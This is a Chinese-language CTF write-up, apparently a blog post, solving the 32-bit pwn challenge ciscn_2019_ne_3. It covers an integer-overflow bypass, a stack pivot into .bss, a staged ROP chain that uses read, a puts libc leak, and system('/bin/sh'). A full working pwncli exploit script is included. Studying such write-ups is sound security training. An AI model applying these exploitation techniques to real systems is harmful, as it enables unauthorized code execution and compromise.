# ciscn_2019_ne_3



### 总结

一道很无语的`rop`的题目，由于在`puts`调用中会卡在`[ebp - 0x46c]`这样的语句，所以只能把栈往抬高，避免访问到不可写的内存区域。

- 如果题目给的`rop`很短，那么需要想办法调用`read`写入更长的`rop`链
- 必要的时候需要把栈抬高，避免在函数调用过程中，让不可写的内存写入了东西，直接`core dump`
- `call`的时候会放置下一条指令到`esp`，但如果直接覆写了`esp`，那么还是可以继续劫持程序流

<!-- more -->

### 题目分析

#### checksec

很久没碰到`32`位的题目了，环境为`libc-2.27.so`

![image-20210912160406760](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160406760.png)

#### 函数分析

最开始的时候，`IDA`无法识别函数。只需要在`__printf_chk`这个函数上按下`Y`，修改函数签名为`int __printf_chk(int, const char*, ...);`即可

流程很简单，先往`bss`段上写数据，然后有整数溢出和栈溢出：

![image-20210912160631922](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160631922.png)

![image-20210912160709015](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160709015.png)

刚开始以为是很简单的栈溢出，后来瞅了眼`main`函数退出的时候的汇编，发现栈直接被改变了：

![image-20210912160859021](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160859021.png)

这里的`esp`来自于`ecx`，而`ecx`可控。没有地址泄露，所以只能往`bss`段搞栈迁移。

所以一开始直接准备：

- `puts`泄露地址
- 重新执行`main`
- 再次`rop`执行`system(/bin/sh)`、

然而事情，并没有那么简单，在调用`puts`的时候，由于栈太低了，会往更低处的不可写的区域赋值，程序直接`GG`。然后想改成`__printf_chk`，也遇到了类似的问题。

所以只能找一下`read`函数，然后重新写一段长的`rop`，并把栈抬到高处，再进行泄露和利用。

在输入`passwd`长度的时候，只能写入`0x10`个字节。去掉要转化为负数的`-1\x00\x00`，只剩`12`个字节可以操作。如果直接`rop`，由于`read`有`3`个参数，所以至少需要`0x14`的大小，很显然这里不够。所以只能利用程序中的`call read`这样的汇编执令来缩小`rop`的长度。

我们必须要控制的参数有`read`的第二个和第三个参数，指明往`bss`段写和写的大小。那么第一个参数`fd`就没法控制，好在程序中就有，如下图：

![image-20210912161735548](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912161735548.png)

有一个`push 0`，省了不少事情。

因此，最终的解题思路为：

- 将栈迁移到`bss`段

- `rop`往`buf`区域写更长的`rop`
- 将栈抬高
- 执行`puts`泄露地址
- 再次执行`read`读入`rop`
- 执行`system(/bin/sh)`

这里还是不能回到`main`函数，还是会出现往非法内存区域写入的操作。索性直接再次读入`rop`，然后刚好`esp`也在`bss`段上，所以可控制执行`system(/bin/sh)`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = ELF('libc-2.27-32bit.so')

"""
输入负数即可绕过校验
之后进行rop
"""
buffer_addr = 0x0804A060
puts_addr = 0x8048490
puts_got_addr = 0x804A01C
main_addr = 0x80486ea

read_addr = 0x8048460

p.sendafter("Now, Challenger, What's name?\n:", "aaaaaa")
p.sendafter("Please set the length of password: ", b"-1\x00\x00"+p32(0x8048793)+p32(buffer_addr)+p32(0xf00))

p.sendlineafter(":", flat("a"*72, 
buffer_addr+8, # ecx
0, #ebx
0, # edi
buffer_addr + 0xf00, # ebp
))

sleep(1)
payload = flat({
    0:[0x080487B3, buffer_addr+0x500, 0, 0, buffer_addr+0xf00],
    0x500-4: [puts_addr, 0x08048431, puts_got_addr, read_addr, 0, 0, buffer_addr, 0xf00]
}, filler="\x00")

p.send(payload)

msg = p.recvuntil("\xf7")

libc_base_addr = u32(msg[-4:]) - libc.sym['puts']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

sleep(1)

p.send(flat("/bin/sh\x00", cyclic(0x4ec-8), libc.sym['system'], 0, buffer_addr))

p.interactive()

```

栈迁移：

![image-20210912162318146](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162318146.png)

泄露地址：

![image-20210912162424638](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162424638.png)

第二次`read`：

![image-20210912162453753](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162453753.png)

拿`shell`：

![image-20210912162712826](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162712826.png)



远程打：

![image-20210912162150712](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162150712.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-09-12-ciscn-2019-ne-3/  

